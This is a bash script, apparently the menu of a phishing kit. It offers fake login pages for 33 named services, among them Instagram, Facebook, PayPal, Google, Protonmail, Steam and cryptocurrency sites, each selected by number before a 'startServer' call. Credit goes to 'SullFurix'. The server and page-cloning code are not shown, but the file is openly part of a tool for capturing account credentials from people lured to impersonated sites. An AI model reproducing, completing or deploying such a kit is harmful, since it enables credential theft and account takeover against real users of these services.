#!/bin/bash

menu() {
  printf "\n"
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Amazon\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m\n"
  printf "\n"
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m97\e[0m\e[1;92m]\e[0m\e[1;93mDisclaimer  \e[0m\e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93mCredits  \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93mExit\e[0m\n"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

  if [[ $option == 1 || $option == 01 ]]; then
  server="instagram"
  startServer

  elif [[ $option == 2 || $option == 02 ]]; then
  server="facebook"
  startServer

  elif [[ $option == 3 || $option == 03 ]]; then
  server="snapchat"
  startServer

  elif [[ $option == 4 || $option == 04 ]]; then
  server="twitter"
  startServer

  elif [[ $option == 5 || $option == 05 ]]; then
  server="github"
  startServer

  elif [[ $option == 6 || $option == 06 ]]; then
  server="google"
  startServer

  elif [[ $option == 7 || $option == 07 ]]; then
  server="spotify"
  startServer

  elif [[ $option == 8 || $option == 08 ]]; then
  server="netflix"
  startServer

  elif [[ $option == 9 || $option == 09 ]]; then
  server="paypal"
  startServer

  elif [[ $option == 10 ]]; then
  server="origin"
  startServer

  elif [[ $option == 11 ]]; then
  server="steam"
  startServer

  elif [[ $option == 12 ]]; then
  server="yahoo"
  startServer

  elif [[ $option == 13 ]]; then
  server="linkedin"
  startServer

  elif [[ $option == 14 ]]; then
  server="protonmail"
  startServer

  elif [[ $option == 15 ]]; then
  server="wordpress"
  startServer

  elif [[ $option == 16 ]]; then
  server="microsoft"
  startServer

  elif [[ $option == 17 ]]; then
  server="instafollowers"
  startServer

  elif [[ $option == 18 ]]; then
  server="ebay"
  startServer

  elif [[ $option == 19 ]]; then
  server="pinterest"
  startServer

  elif [[ $option == 20 ]]; then
  server="cryptocurrency"
  startServer

  elif [[ $option == 21 ]]; then
  server="verzion"
  startServer

  elif [[ $option == 22 ]]; then
  server="dropbox"
  startServer

  elif [[ $option == 23 ]]; then
  server="adobe"
  startServer

  elif [[ $option == 24 ]]; then
  server="shopify"
  startServer

  elif [[ $option == 25 ]]; then
  server="messenger"
  startServer

  elif [[ $option == 26 ]]; then
  server="gitlab"
  startServer

  elif [[ $option == 27 ]]; then
  server="twitch"
  startServer

  elif [[ $option == 28 ]]; then
  server="myspace"
  startServer

  elif [[ $option == 29 ]]; then
  server="badoo"
  startServer

  elif [[ $option == 30 ]]; then
  server="vk"
  startServer

  elif [[ $option == 31 ]]; then
  server="yandex"
  startServer

  elif [[ $option == 32 ]]; then
  server="devianart"
  startServer

  elif [[ $option == 33 ]]; then
  server="amazon"
  startServer

  elif [[ $option == 97 ]]; then
    disclaimer
    sleep 5
    clear
    banner
    menu

  elif [[ $option == 98 ]]; then
    printf "\e[1;93m [!] SullFurix (@sullfurix)\e[0m\n"
    sleep 3
    clear
    banner
    menu

  elif [[ $option == 99 ]]; then
    stop
    exit 1
    
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    banner
    menu
  fi
}
